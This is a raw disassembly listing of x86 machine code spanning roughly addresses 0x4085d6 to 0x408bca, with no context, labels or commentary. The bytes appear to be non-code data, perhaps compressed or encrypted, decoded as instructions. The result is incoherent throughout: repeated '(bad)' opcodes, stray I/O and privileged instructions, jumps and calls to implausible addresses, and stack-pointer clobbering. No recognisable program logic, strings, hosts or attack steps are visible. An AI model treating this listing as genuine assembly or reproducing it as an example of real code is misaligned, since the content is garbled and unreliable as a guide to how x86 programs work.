  4085d6:	d4 51                	aam    $0x51
  4085d8:	18 b8 20 30 2a 6a    	sbb    %bh,0x6a2a3020(%eax)
  4085de:	cc                   	int3
  4085df:	e1 0e                	loope  0x4085ef
  4085e1:	0c 03                	or     $0x3,%al
  4085e3:	7a 3b                	jp     0x408620
  4085e5:	49                   	dec    %ecx
  4085e6:	14 01                	adc    $0x1,%al
  4085e8:	e4 ca                	in     $0xca,%al
  4085ea:	4e                   	dec    %esi
  4085eb:	1f                   	pop    %ds
  4085ec:	e8 47 14 67 ef       	call   0xefa79a38
  4085f1:	f9                   	stc
  4085f2:	66 18 1b             	data16 sbb %bl,(%ebx)
  4085f5:	04 b9                	add    $0xb9,%al
  4085f7:	90                   	nop
  4085f8:	65 24 01             	gs and $0x1,%al
  4085fb:	2c 59                	sub    $0x59,%al
  4085fd:	3d 28 2a 6b 6a       	cmp    $0x6a6b2a28,%eax
  408602:	48                   	dec    %eax
  408603:	8d 90 f2 74 05 cc    	lea    -0x33fa8b0e(%eax),%edx
  408609:	b2 d1                	mov    $0xd1,%dl
  40860b:	94                   	xchg   %eax,%esp
  40860c:	83 90 9c 06 90 30 63 	adcl   $0x63,0x3090069c(%eax)
  408613:	cf                   	iret
  408614:	6c                   	insb   (%dx),%es:(%edi)
  408615:	fe                   	(bad)
  408616:	a0 0b 68 c9 07       	mov    0x7c9680b,%al
  40861b:	24 c6                	and    $0xc6,%al
  40861d:	68 64 d7 01 60       	push   $0x6001d764
  408622:	64 fd                	fs std
  408624:	6d                   	insl   (%dx),%es:(%edi)
  408625:	76 6e                	jbe    0x408695
  408627:	20 19                	and    %bl,(%ecx)
  408629:	30 60 fd             	xor    %ah,-0x3(%eax)
  40862c:	dc 05 e4 92 e7 f3    	faddl  0xf3e792e4
  408632:	0a 5c 00 00          	or     0x0(%eax,%eax,1),%bl
  408636:	58                   	pop    %eax
  408637:	54                   	push   %esp
  408638:	4a                   	dec    %edx
  408639:	46                   	inc    %esi
  40863a:	e2 b9                	loop   0x4085f5
  40863c:	50                   	push   %eax
  40863d:	ff                   	lcall  (bad)
  40863e:	de 03                	fiadds (%ebx)
  408640:	99                   	cltd
  408641:	93                   	xchg   %eax,%ebx
  408642:	78 5f                	js     0x4086a3
  408644:	6e                   	outsb  %ds:(%esi),(%dx)
  408645:	8b 05 de e4 ac ce    	mov    0xceace4de,%eax
  40864b:	d9 81 62 04 82 60    	flds   0x60820462(%ecx)
  408651:	90                   	nop
  408652:	19 1b                	sbb    %ebx,(%ebx)
  408654:	9b                   	fwait
  408655:	0d 32 44 84 38       	or     $0x38844432,%eax
  40865a:	ab                   	stos   %eax,%es:(%edi)
  40865b:	f2 39 32             	repnz cmp %esi,(%edx)
  40865e:	d8 2d 5c 05 10 ff    	fsubrs 0xff10055c
  408664:	ff 4b ce             	decl   -0x32(%ebx)
  408667:	ce                   	into
  408668:	01 7d a8             	add    %edi,-0x58(%ebp)
  40866b:	4c                   	dec    %esp
  40866c:	cf                   	iret
  40866d:	de c8                	fmulp  %st,%st(0)
  40866f:	c3                   	ret
  408670:	48                   	dec    %eax
  408671:	fd                   	std
  408672:	11 90 44 0b 05 0d    	adc    %edx,0xd050b44(%eax)
  408678:	94                   	xchg   %eax,%esp
  408679:	59                   	pop    %ecx
  40867a:	72 9b                	jb     0x408617
  40867c:	70 11                	jo     0x40868f
  40867e:	3f                   	aas
  40867f:	87 47 35             	xchg   %eax,0x35(%edi)
  408682:	eb 8c                	jmp    0x408610
  408684:	f7 06 e6 0e 0c 8f    	testl  $0x8f0c0ee6,(%esi)
  40868a:	39 05 2d 31 73 a5    	cmp    %eax,0xa573312d
  408690:	49                   	dec    %ecx
  408691:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408692:	8f c6                	pop    %esi
  408694:	13 b3 13 66 33 5e    	adc    0x5e336613(%ebx),%esi
  40869a:	16                   	push   %ss
  40869b:	bc a9 71 b7 92       	mov    $0x92b771a9,%esp
  4086a0:	17                   	pop    %ss
  4086a1:	16                   	push   %ss
  4086a2:	c2 34 fd             	ret    $0xfd34
  4086a5:	14 d9                	adc    $0xd9,%al
  4086a7:	01 b2 8b b0 4c fd    	add    %esi,-0x2b34f75(%edx)
  4086ad:	36 9d                	ss popf
  4086af:	6b 84 c3 22 de 38 64 	imul   $0xffffffff,0x6438de22(%ebx,%eax,8),%eax
  4086b6:	ff 
  4086b7:	69 21 73 b4 27 e8    	imul   $0xe827b473,(%ecx),%esp
  4086bd:	b6 ef                	mov    $0xef,%dh
  4086bf:	0d 16 3b 5d df       	or     $0xdf5d3b16,%eax
  4086c4:	12 e7                	adc    %bh,%ah
  4086c6:	0f b7 8d 49 8d 30 51 	movzwl 0x51308d49(%ebp),%ecx
  4086cd:	90                   	nop
  4086ce:	b4 cd                	mov    $0xcd,%ah
  4086d0:	c0 4b 38 e4          	rorb   $0xe4,0x38(%ebx)
  4086d4:	0c 8d                	or     $0x8d,%al
  4086d6:	64 60                	fs pusha
  4086d8:	d9 6c 60 9d          	fldcw  -0x63(%eax,%eiz,2)
  4086dc:	30 e3                	xor    %ah,%bl
  4086de:	b0 aa                	mov    $0xaa,%al
  4086e0:	c2 b0 97             	ret    $0x97b0
  4086e3:	84 83 25 3b 63 23    	test   %al,0x23633b25(%ebx)
  4086e9:	1d 23 03 8c d6       	sbb    $0xd68c0323,%eax
  4086ee:	12 8b 40 84 09 81    	adc    -0x7ef67bc0(%ebx),%cl
  4086f4:	19 19                	sbb    %ebx,(%ecx)
  4086f6:	3e 80 45 20 1b       	addb   $0x1b,%ds:0x20(%ebp)
  4086fb:	24 3b                	and    $0x3b,%al
  4086fd:	1a 26                	sbb    (%esi),%ah
  4086ff:	66 e8 26 cc          	callw  0x5329
  408703:	36 30 08             	xor    %cl,%ss:(%eax)
  408706:	c1 11 3d             	rcll   $0x3d,(%ecx)
  408709:	19 54 21 7b          	sbb    %edx,0x7b(%ecx,%eiz,1)
  40870d:	9b                   	fwait
  40870e:	0b f2                	or     %edx,%esi
  408710:	49                   	dec    %ecx
  408711:	2c 0f                	sub    $0xf,%al
  408713:	15 09 b9 e4 06       	adc    $0x6e4b909,%eax
  408718:	a0 09 64 08 e1       	mov    0xe1086409,%al
  40871d:	64 ec                	fs in  (%dx),%al
  40871f:	b0 88                	mov    $0x88,%al
  408721:	68 1e 8f 44 54       	push   $0x54448f1e
  408726:	5c                   	pop    %esp
  408727:	9e                   	sahf
  408728:	ec                   	in     (%dx),%al
  408729:	66 24 9f             	data16 and $0x9f,%al
  40872c:	6c                   	insb   (%dx),%es:(%edi)
  40872d:	13 e0                	adc    %eax,%esp
  40872f:	b9 e8 fc b2 fa       	mov    $0xfab2fce8,%ecx
  408734:	39 a5 55 83 fa 70    	cmp    %esp,0x70fa8355(%ebp)
  40873a:	11 9d b8 0a 67 27    	adc    %ebx,0x27670ab8(%ebp)
  408740:	db 61 b5             	(bad) -0x4b(%ecx)
  408743:	94                   	xchg   %eax,%esp
  408744:	45                   	inc    %ebp
  408745:	48                   	dec    %eax
  408746:	48                   	dec    %eax
  408747:	39 0f                	cmp    %ecx,(%edi)
  408749:	94                   	xchg   %eax,%esp
  40874a:	07                   	pop    %es
  40874b:	58                   	pop    %eax
  40874c:	be b3 3e ce 68       	mov    $0x68ce3eb3,%esi
  408751:	b3 6c                	mov    $0x6c,%bl
  408753:	30 5e 30             	xor    %bl,0x30(%esi)
  408756:	43                   	inc    %ebx
  408757:	aa                   	stos   %al,%es:(%edi)
  408758:	aa                   	stos   %al,%es:(%edi)
  408759:	0e                   	push   %cs
  40875a:	21 91 64 c7 9b 8d    	and    %edx,-0x7264389c(%ecx)
  408760:	26 21 87 e5 a8 92 47 	and    %eax,%es:0x4792a8e5(%edi)
  408767:	90                   	nop
  408768:	14 a1                	adc    $0xa1,%al
  40876a:	ed                   	in     (%dx),%eax
  40876b:	17                   	pop    %ss
  40876c:	f2 2a 64 e0 27       	repnz sub 0x27(%eax,%eiz,8),%ah
  408771:	64 13 39             	adc    %fs:(%ecx),%edi
  408774:	c1 6c 93 3c ad       	shrl   $0xad,0x3c(%ebx,%edx,4)
  408779:	2c fe                	sub    $0xfe,%al
  40877b:	48                   	dec    %eax
  40877c:	c6                   	(bad)
  40877d:	65 e7 2a             	gs out %eax,$0x2a
  408780:	3e 61                	ds popa
  408782:	11 0d 91 f1 cd 48    	adc    %ecx,0x48cdf191
  408788:	0c 58                	or     $0x58,%al
  40878a:	83 1e 92             	sbbl   $0xffffff92,(%esi)
  40878d:	1d 48 4e 13 bc       	sbb    $0xbc134e48,%eax
  408792:	11 d5                	adc    %edx,%ebp
  408794:	57                   	push   %edi
  408795:	43                   	inc    %ebx
  408796:	03 f6                	add    %esi,%esi
  408798:	f1                   	int1
  408799:	06                   	push   %es
  40879a:	30 85 98 dd 38 77    	xor    %al,0x7738dd98(%ebp)
  4087a0:	20 07                	and    %al,(%edi)
  4087a2:	c2 20 f9             	ret    $0xf920
  4087a5:	0c 8b                	or     $0x8b,%al
  4087a7:	8c e4                	mov    %fs,%esp
  4087a9:	84 3c a9             	test   %bh,(%ecx,%ebp,4)
  4087ac:	35 54 fd 54 fd       	xor    $0xfd54fd54,%eax
  4087b1:	98                   	cwtl
  4087b2:	90                   	nop
  4087b3:	cf                   	iret
  4087b4:	01 08                	add    %ecx,(%eax)
  4087b6:	fd                   	std
  4087b7:	54                   	push   %esp
  4087b8:	fd                   	std
  4087b9:	08 91 5a 76 46 48    	or     %dl,0x4846765a(%ecx)
  4087bf:	66 5d                	pop    %bp
  4087c1:	35 92 85 60 b1       	xor    $0xb1608592,%eax
  4087c6:	8b de                	mov    %esi,%ebx
  4087c8:	15 47 72 ec 1c       	adc    $0x1cec7247,%eax
  4087cd:	f2 d0 b2 00 39 2a 84 	repnz shlb $1,-0x7bd5c700(%edx)
  4087d4:	1e                   	push   %ds
  4087d5:	71 2e                	jno    0x408805
  4087d7:	94                   	xchg   %eax,%esp
  4087d8:	a3 4c 02 2b a1       	mov    %eax,0xa12b024c
  4087dd:	b7 0e                	mov    $0xe,%bh
  4087df:	41                   	inc    %ecx
  4087e0:	de 0c 18             	fimuls (%eax,%ebx,1)
  4087e3:	27                   	daa
  4087e4:	02 55 13             	add    0x13(%ebp),%dl
  4087e7:	74 90                	je     0x408779
  4087e9:	48                   	dec    %eax
  4087ea:	28 21                	sub    %ah,(%ecx)
  4087ec:	fd                   	std
  4087ed:	44                   	inc    %esp
  4087ee:	9c                   	pushf
  4087ef:	05 31 96 d3 ca       	add    $0xcad39631,%eax
  4087f4:	59                   	pop    %ecx
  4087f5:	10 cf                	adc    %cl,%bh
  4087f7:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4087f8:	0c 8c                	or     $0x8c,%al
  4087fa:	0c 61                	or     $0x61,%al
  4087fc:	5c                   	pop    %esp
  4087fd:	3f                   	aas
  4087fe:	9c                   	pushf
  4087ff:	05 e1 25 a1 03       	add    $0x3a125e1,%eax
  408804:	6a 33                	push   $0x33
  408806:	0d 68 23 20 f1       	or     $0xf1202368,%eax
  40880b:	39 a9 ac 64 d1 2d    	cmp    %ebp,0x2dd164ac(%ecx)
  408811:	31 b3 8d c5 82 f4    	xor    %esi,-0xb7d3a73(%ebx)
  408817:	05 f0 7d d8 64       	add    $0x64d87df0,%eax
  40881c:	ac                   	lods   %ds:(%esi),%al
  40881d:	9d                   	popf
  40881e:	82 0e 0b             	orb    $0xb,(%esi)
  408821:	62 5b 91             	bound  %ebx,-0x6f(%ebx)
  408824:	df 0b                	fisttps (%ebx)
  408826:	ce                   	into
  408827:	ac                   	lods   %ds:(%esi),%al
  408828:	d6                   	salc
  408829:	1a 8e 2e 98 91 9b    	sbb    -0x646e67d2(%esi),%cl
  40882f:	e1 f8                	loope  0x408829
  408831:	81 f8 77 b3 8f 1f    	cmp    $0x1f8fb377,%eax
  408837:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408838:	d0 ec                	shr    $1,%ah
  40883a:	31 03                	xor    %eax,(%ebx)
  40883c:	33 08                	xor    (%eax),%ecx
  40883e:	c1 e1 02             	shl    $0x2,%ecx
  408841:	7d db                	jge    0x40881e
  408843:	68 51 a8 60 57       	push   $0x5760a851
  408848:	b3 97                	mov    $0x97,%bl
  40884a:	ae                   	scas   %es:(%edi),%al
  40884b:	7b cc                	jnp    0x408819
  40884d:	be 6c c2 e4 7d       	mov    $0x7de4c26c,%esi
  408852:	f0 eb 92             	lock jmp 0x4087e7
  408855:	37                   	aaa
  408856:	03 29                	add    (%ecx),%ebp
  408858:	1e                   	push   %ds
  408859:	42                   	inc    %edx
  40885a:	3d 97 c0 29 4d       	cmp    $0x4d29c097,%eax
  40885f:	68 40 88 14 3d       	push   $0x3d148840
  408864:	c2 cc 8b             	ret    $0x8bcc
  408867:	2d 3b 58 34 c0       	sub    $0xc034583b,%eax
  40886c:	10 f5                	adc    %dh,%ch
  40886e:	c6                   	(bad)
  40886f:	23 f3                	and    %ebx,%esi
  408871:	c9                   	leave
  408872:	05 19 91 0f 13       	add    $0x130f9119,%eax
  408877:	3f                   	aas
  408878:	b4 b3                	mov    $0xb3,%ah
  40887a:	62 c9 d9             	(bad) {rd-bad},{bad}
  40887d:	b0 f7                	mov    $0xf7,%al
  40887f:	f4                   	hlt
  408880:	00 b6 64 43 98 f0    	add    %dh,-0xf67bc9c(%esi)
  408886:	98                   	cwtl
  408887:	41                   	inc    %ecx
  408888:	00 ff                	add    %bh,%bh
  40888a:	8a 04 f6             	mov    (%esi,%esi,8),%al
  40888d:	0d 22 13 b2 b6       	or     $0xb6b21322,%eax
  408892:	05 1f b5 57 d9       	add    $0xd957b51f,%eax
  408897:	e9 05 69 ec c3       	jmp    0xc42cf1a1
  40889c:	82 49 8e 70          	orb    $0x70,-0x72(%ecx)
  4088a0:	16                   	push   %ss
  4088a1:	c0 f4 3d             	shl    $0x3d,%ah
  4088a4:	4a                   	dec    %edx
  4088a5:	5e                   	pop    %esi
  4088a6:	56                   	push   %esi
  4088a7:	7c 18                	jl     0x4088c1
  4088a9:	d9 f1                	fyl2x
  4088ab:	16                   	push   %ss
  4088ac:	e6 d6                	out    %al,$0xd6
  4088ae:	68 6c 76 60 01       	push   $0x160766c
  4088b3:	e4 7b                	in     $0x7b,%al
  4088b5:	08 a8 ed 68 e8 96    	or     %ch,-0x69179713(%eax)
  4088bb:	e1 e1                	loope  0x40889e
  4088bd:	0f 3f                	(bad)
  4088bf:	d5 4d                	aad    $0x4d
  4088c1:	ea bb ea da 93 6c 2f 	ljmp   $0x2f6c,$0x93daeabb
  4088c8:	e7 0b                	out    %eax,$0xb
  4088ca:	e4 83                	in     $0x83,%al
  4088cc:	c1 0d 24 3d b2 62 21 	rorl   $0x21,0x62b23d24
  4088d3:	0f 14 b8 19 af 58 f1 	unpcklps -0xea750e7(%eax),%xmm7
  4088da:	6e                   	outsb  %ds:(%esi),(%dx)
  4088db:	c8 8e a3 8b          	enter  $0xa38e,$0x8b
  4088df:	08 51 80             	or     %dl,-0x80(%ecx)
  4088e2:	e8 f8 64 89 72       	call   0x72c9eddf
  4088e7:	e0 9c                	loopne 0x408885
  4088e9:	90                   	nop
  4088ea:	82 43 02 36          	addb   $0x36,0x2(%ebx)
  4088ee:	76 49                	jbe    0x408939
  4088f0:	44                   	inc    %esp
  4088f1:	bd db 32 10 e4       	mov    $0xe41032db,%ebp
  4088f6:	38 42 9c             	cmp    %al,-0x64(%edx)
  4088f9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4088fa:	df 0d 7c f9 12 da    	fisttps 0xda12f97c
  408900:	19 9a c0 c8 c0 99    	sbb    %ebx,-0x663f3740(%edx)
  408906:	4b                   	dec    %ebx
  408907:	7f 55                	jg     0x40895e
  408909:	c4 35 f6 b0 65 e1    	les    0xe165b0f6,%esi
  40890f:	37                   	aaa
  408910:	0c 2d                	or     $0x2d,%al
  408912:	17                   	pop    %ss
  408913:	e9 66 77 88 20       	jmp    0x20c9007e
  408918:	cb                   	lret
  408919:	d8 9c bf 10 bd 19 34 	fcomps 0x3419bd10(%edi,%edi,4)
  408920:	d8 a0 66 08 03 4f    	fsubs  0x4f030866(%eax)
  408926:	b2 58                	mov    $0x58,%dl
  408928:	06                   	push   %es
  408929:	d9 5c 18 2e          	fstps  0x2e(%eax,%ebx,1)
  40892d:	d4 d4                	aam    $0xd4
  40892f:	3a 06                	cmp    (%esi),%al
  408931:	16                   	push   %ss
  408932:	ee                   	out    %al,(%dx)
  408933:	d4 6b                	aam    $0x6b
  408935:	10 37                	adc    %dh,(%edi)
  408937:	eb 06                	jmp    0x40893f
  408939:	d6                   	salc
  40893a:	ee                   	out    %al,(%dx)
  40893b:	44                   	inc    %esp
  40893c:	11 39                	adc    %edi,(%ecx)
  40893e:	d0 ed                	shr    $1,%ch
  408940:	40                   	inc    %eax
  408941:	22 40 3a             	and    0x3a(%eax),%al
  408944:	c9                   	leave
  408945:	b1 1a                	mov    $0x1a,%cl
  408947:	b1 eb                	mov    $0xeb,%cl
  408949:	c3                   	ret
  40894a:	09 4a 60             	or     %ecx,0x60(%edx)
  40894d:	01 42 c2             	add    %eax,-0x3e(%edx)
  408950:	b2 0e                	mov    $0xe,%dl
  408952:	45                   	inc    %ebp
  408953:	b4 47                	mov    $0x47,%ah
  408955:	15 dc 72 99 33       	adc    $0x339972dc,%eax
  40895a:	f5                   	cmc
  40895b:	d4 5b                	aam    $0x5b
  40895d:	37                   	aaa
  40895e:	b0 fe                	mov    $0xfe,%al
  408960:	26 db ac cf 0b 10 37 	fldt   %es:0x1137100b(%edi,%ecx,8)
  408967:	11 
  408968:	ac                   	lods   %ds:(%esi),%al
  408969:	e9 66 f0 0c 2b       	jmp    0x2b4d79d4
  40896e:	c1 f8 34             	sar    $0x34,%eax
  408971:	17                   	pop    %ss
  408972:	a8 45                	test   $0x45,%al
  408974:	87 8d 25 26 a4 38    	xchg   %ecx,0x38a42625(%ebp)
  40897a:	18 4d 59             	sbb    %cl,0x59(%ebp)
  40897d:	2f                   	das
  40897e:	ab                   	stos   %eax,%es:(%edi)
  40897f:	95                   	xchg   %eax,%ebp
  408980:	9d                   	popf
  408981:	55                   	push   %ebp
  408982:	f4                   	hlt
  408983:	9a a0 e9 7a af 81 38 	lcall  $0x3881,$0xaf7ae9a0
  40898a:	97                   	xchg   %eax,%edi
  40898b:	11 49 b4             	adc    %ecx,-0x4c(%ecx)
  40898e:	42                   	inc    %edx
  40898f:	28 09                	sub    %cl,(%ecx)
  408991:	de aa ca 80 7a 1d    	fisubrs 0x1d7a80ca(%edx)
  408997:	8f 42 f1             	pop    -0xf(%edx)
  40899a:	10 f2                	adc    %dh,%dl
  40899c:	3b 65 66             	cmp    0x66(%ebp),%esp
  40899f:	08 d9                	or     %bl,%cl
  4089a1:	ba c0 34 25 20       	mov    $0x202534c0,%edx
  4089a6:	17                   	pop    %ss
  4089a7:	72 d6                	jb     0x40897f
  4089a9:	de b5 b4 b4 0c c6    	fidivs -0x39f34b4c(%ebp)
  4089af:	c8 0a 71 5d          	enter  $0x710a,$0x5d
  4089b3:	a2 60 4c 2a 61       	mov    %al,0x612a4c60
  4089b8:	6a 33                	push   $0x33
  4089ba:	c8 1b 64 67          	enter  $0x641b,$0x67
  4089be:	ea b8 1c 36 30 3d ec 	ljmp   $0xec3d,$0x30361cb8
  4089c5:	f8                   	clc
  4089c6:	2b 67 6b             	sub    0x6b(%edi),%esp
  4089c9:	65 14 f5             	gs adc $0xf5,%al
  4089cc:	a1 b8 b3 10 59       	mov    0x5910b3b8,%eax
  4089d1:	78 3b                	js     0x408a0e
  4089d3:	f3 b8 d8 18 0e 16    	repz mov $0x160e18d8,%eax
  4089d9:	0d d8 fd c4 04       	or     $0x4c4fdd8,%eax
  4089de:	af                   	scas   %es:(%edi),%eax
  4089df:	1b 1e                	sbb    (%esi),%ebx
  4089e1:	02 cc                	add    %ah,%cl
  4089e3:	5e                   	pop    %esi
  4089e4:	c5 3b                	lds    (%ebx),%edi
  4089e6:	4c                   	dec    %esp
  4089e7:	50                   	push   %eax
  4089e8:	16                   	push   %ss
  4089e9:	d8 b5 49 5c e6 ab    	fdivs  -0x5419a3b7(%ebp)
  4089ef:	08 13                	or     %dl,(%ebx)
  4089f1:	2a ee                	sub    %dh,%ch
  4089f3:	99                   	cltd
  4089f4:	3b ac 7b 46 e4 c8 b8 	cmp    -0x47371bba(%ebx,%edi,2),%ebp
  4089fb:	ba cc 9b 67 2c       	mov    $0x2c679bcc,%edx
  408a00:	20 9f ef 4d fc 64    	and    %bl,0x64fc4def(%edi)
  408a06:	1f                   	pop    %ds
  408a07:	14 65                	adc    $0x65,%al
  408a09:	2c 0d                	sub    $0xd,%al
  408a0b:	0c fa                	or     $0xfa,%al
  408a0d:	06                   	push   %es
  408a0e:	74 6b                	je     0x408a7b
  408a10:	19 2d 6a 52 03 33    	sbb    %ebp,0x3303526a
  408a16:	c5 0f                	lds    (%edi),%ecx
  408a18:	60                   	pusha
  408a19:	26 07                	es pop %es
  408a1b:	f6 39                	idivb  (%ecx)
  408a1d:	95                   	xchg   %eax,%ebp
  408a1e:	e1 98                	loope  0x4089b8
  408a20:	69 d4 36 92 2f 29    	imul   $0x292f9236,%esp,%edx
  408a26:	de e5                	fsubp  %st,%st(5)
  408a28:	ff                   	(bad)
  408a29:	fe                   	(bad)
  408a2a:	20 06                	and    %al,(%esi)
  408a2c:	1d d8 2c 1a 3c       	sbb    $0x3c1a2cd8,%eax
  408a31:	0c 84                	or     $0x84,%al
  408a33:	ec                   	in     (%dx),%al
  408a34:	bd ac 5c 0f 3c       	mov    $0x3c0f5cac,%ebp
  408a39:	16                   	push   %ss
  408a3a:	eb a3                	jmp    0x4089df
  408a3c:	1a 81 45 31 f7 8f    	sbb    -0x7008cebb(%ecx),%al
  408a42:	9c                   	pushf
  408a43:	c8 48 fd 6c          	enter  $0xfd48,$0x6c
  408a47:	48                   	dec    %eax
  408a48:	14 84                	adc    $0x84,%al
  408a4a:	82 db 07             	sbb    $0x7,%bl
  408a4d:	02 cb                	add    %bl,%cl
  408a4f:	1a e4                	sbb    %ah,%ah
  408a51:	f4                   	hlt
  408a52:	f0 d2 f3             	lock shl %cl,%bl
  408a55:	34 02                	xor    $0x2,%al
  408a57:	14 78                	adc    $0x78,%al
  408a59:	dc 8d 8b 50 e4 50    	fmull  0x50e4508b(%ebp)
  408a5f:	0f a4 18 6a          	shld   $0x6a,%ebx,(%eax)
  408a63:	be 1c 34 10 68       	mov    $0x6810341c,%esi
  408a68:	d1 84 4c 8d be ff b2 	roll   $1,-0x4d004173(%esp,%ecx,2)
  408a6f:	91                   	xchg   %eax,%ecx
  408a70:	06                   	push   %es
  408a71:	ec                   	in     (%dx),%al
  408a72:	ec                   	in     (%dx),%al
  408a73:	2e 1b a0 ec b0 c1 06 	sbb    %cs:0x6c1b0ec(%eax),%esp
  408a7a:	04 5c                	add    $0x5c,%al
  408a7c:	0b 89 f0 26 6f 1a    	or     0x1a6f26f0(%ecx),%ecx
  408a82:	69 d8 85 b7 b0 6e    	imul   $0x6eb0b785,%eax,%ebx
  408a88:	f0 20 8b 10 39 d1 e0 	lock and %cl,-0x1f2ec6f0(%ebx)
  408a8f:	34 08                	xor    $0x8,%al
  408a91:	4b                   	dec    %ebx
  408a92:	df 52 d8             	fists  -0x28(%edx)
  408a95:	f2 83 db 0c          	repnz sbb $0xc,%ebx
  408a99:	e4 7e                	in     $0x7e,%al
  408a9b:	44                   	inc    %esp
  408a9c:	f4                   	hlt
  408a9d:	eb e0                	jmp    0x408a7f
  408a9f:	1f                   	pop    %ds
  408aa0:	7d 22                	jge    0x408ac4
  408aa2:	ba d6 ae 03 35       	mov    $0x3503aed6,%edx
  408aa7:	f8                   	clc
  408aa8:	0f af ca             	imul   %edx,%ecx
  408aab:	35 8d a5 5b d9       	xor    $0xd95ba58d,%eax
  408ab0:	bb 41 2d 85 1d       	mov    $0x1d852d41,%ebx
  408ab5:	65 22 1f             	and    %gs:(%edi),%bl
  408ab8:	18 1c 2b             	sbb    %bl,(%ebx,%ebp,1)
  408abb:	41                   	inc    %ecx
  408abc:	ad                   	lods   %ds:(%esi),%eax
  408abd:	b8 eb b3 b4 09       	mov    $0x9b4b3eb,%eax
  408ac2:	60                   	pusha
  408ac3:	2e 79 0c             	jns,pn 0x408ad2
  408ac6:	00 1c ff             	add    %bl,(%edi,%edi,8)
  408ac9:	4b                   	dec    %ebx
  408aca:	06                   	push   %es
  408acb:	2b 33                	sub    (%ebx),%esi
  408acd:	34 f7                	xor    $0xf7,%al
  408acf:	fc                   	cld
  408ad0:	0a 09                	or     (%ecx),%cl
  408ad2:	f0 b2 f8             	lock mov $0xf8,%dl
  408ad5:	0a f4                	or     %ah,%dh
  408ad7:	fd                   	std
  408ad8:	fd                   	std
  408ad9:	86 6c c2 84          	xchg   %ch,-0x7c(%edx,%eax,8)
  408add:	5f                   	pop    %edi
  408ade:	c6                   	(bad)
  408adf:	1a fe                	sbb    %dh,%bh
  408ae1:	92                   	xchg   %eax,%edx
  408ae2:	30 c4                	xor    %al,%ah
  408ae4:	40                   	inc    %eax
  408ae5:	c7                   	(bad)
  408ae6:	59                   	pop    %ecx
  408ae7:	c6                   	(bad)
  408ae8:	62 67 66             	bound  %esp,0x66(%edi)
  408aeb:	f4                   	hlt
  408aec:	63 8b 05 98 73 ec    	arpl   %ecx,-0x138c67fb(%ebx)
  408af2:	bd 6a 76 14 cc       	mov    $0xcc14766a,%ebp
  408af7:	2d 61 94 24 ce       	sub    $0xce249461,%eax
  408afc:	0e                   	push   %cs
  408afd:	fc                   	cld
  408afe:	1c 40                	sbb    $0x40,%al
  408b00:	6e                   	outsb  %ds:(%esi),(%dx)
  408b01:	fb                   	sti
  408b02:	1d 9a 6c c1 f0       	sbb    $0xf0c16c9a,%eax
  408b07:	ed                   	in     (%dx),%eax
  408b08:	0a d3                	or     %bl,%dl
  408b0a:	e8 ad c6 36 7b       	call   0x7b7751bc
  408b0f:	05 e4 12 47 b9       	add    $0xb94712e4,%eax
  408b14:	01 bf 56 1c 3a 8d    	add    %edi,-0x72c5e3aa(%edi)
  408b1a:	ec                   	in     (%dx),%al
  408b1b:	ad                   	lods   %ds:(%esi),%eax
  408b1c:	bf 07 d3 e0 7b       	mov    $0x7be0d307,%edi
  408b21:	61                   	popa
  408b22:	1b 66 ca             	sbb    -0x36(%esi),%esp
  408b25:	19 1d 5c 65 40 04    	sbb    %ebx,0x440655c
  408b2b:	0b 43 46             	or     0x46(%ebx),%eax
  408b2e:	b6 01                	mov    $0x1,%dh
  408b30:	0c a3                	or     $0xa3,%al
  408b32:	e8 e8 10 1f 98       	call   0x985f9c1f
  408b37:	9d                   	popf
  408b38:	3d 0e 2d 8b 01       	cmp    $0x18b2d0e,%eax
  408b3d:	cf                   	iret
  408b3e:	6c                   	insb   (%dx),%es:(%edi)
  408b3f:	7f 8f                	jg     0x408ad0
  408b41:	83 89 e1 ba 06 52 50 	orl    $0x50,0x5206bae1(%ecx)
  408b48:	51                   	push   %ecx
  408b49:	31 e4                	xor    %esp,%esp
  408b4b:	3c d9                	cmp    $0xd9,%al
  408b4d:	12 f6                	adc    %dh,%dh
  408b4f:	b9 14 f5 07 1c       	mov    $0x1c07f514,%ecx
  408b54:	5d                   	pop    %ebp
  408b55:	4b                   	dec    %ebx
  408b56:	f4                   	hlt
  408b57:	1b 30                	sbb    (%eax),%esi
  408b59:	57                   	push   %edi
  408b5a:	0d 9e de dc b0       	or     $0xb0dcde9e,%eax
  408b5f:	2b dd                	sub    %ebp,%ebx
  408b61:	e9 5e 1a 41 dc       	jmp    0xdc81a5c4
  408b66:	11 bc 0a 2d db 26 f5 	adc    %edi,-0xad924d3(%edx,%ecx,1)
  408b6d:	21 c1                	and    %eax,%ecx
  408b6f:	9e                   	sahf
  408b70:	c3                   	ret
  408b71:	d8 18                	fcomps (%eax)
  408b73:	c0 cc 56             	ror    $0x56,%ah
  408b76:	e0 0a                	loopne 0x408b82
  408b78:	f7 12                	notl   (%edx)
  408b7a:	e0 44                	loopne 0x408bc0
  408b7c:	4d                   	dec    %ebp
  408b7d:	77 2e                	ja     0x408bad
  408b7f:	99                   	cltd
  408b80:	d0 d0                	rcl    $1,%al
  408b82:	fa                   	cli
  408b83:	f8                   	clc
  408b84:	48                   	dec    %eax
  408b85:	cc                   	int3
  408b86:	20 97 74 46 cc cc    	and    %dl,-0x3333b98c(%edi)
  408b8c:	d4 c5                	aam    $0xc5
  408b8e:	c6 82 c1 ca e0 5a 8d 	movb   $0x8d,0x5ae0cac1(%edx)
  408b95:	13 d9                	adc    %ecx,%ebx
  408b97:	90                   	nop
  408b98:	21 3b                	and    %edi,(%ebx)
  408b9a:	0a ca                	or     %dl,%cl
  408b9c:	fe                   	(bad)
  408b9d:	2f                   	das
  408b9e:	c4 0a                	les    (%edx),%ecx
  408ba0:	9b                   	fwait
  408ba1:	1c e0                	sbb    $0xe0,%al
  408ba3:	fa                   	cli
  408ba4:	87 b9 65 67 71 10    	xchg   %edi,0x10716765(%ecx)
  408baa:	f7 12                	notl   (%edx)
  408bac:	1b 10                	sbb    (%eax),%edx
  408bae:	63 32                	arpl   %esi,(%edx)
  408bb0:	72 20                	jb     0x408bd2
  408bb2:	fe                   	(bad)
  408bb3:	10 9d f6 83 25 07    	adc    %bl,0x72583f6(%ebp)
  408bb9:	38 03                	cmp    %al,(%ebx)
  408bbb:	55                   	push   %ebp
  408bbc:	b8 9f 0a 72 c9       	mov    $0xc9720a9f,%eax
  408bc1:	c8 33 dc 00          	enter  $0xdc33,$0x0
  408bc5:	a0 9c c9 25 97       	mov    0x9725c99c,%al
  408bca:	5c                   	pop    %esp
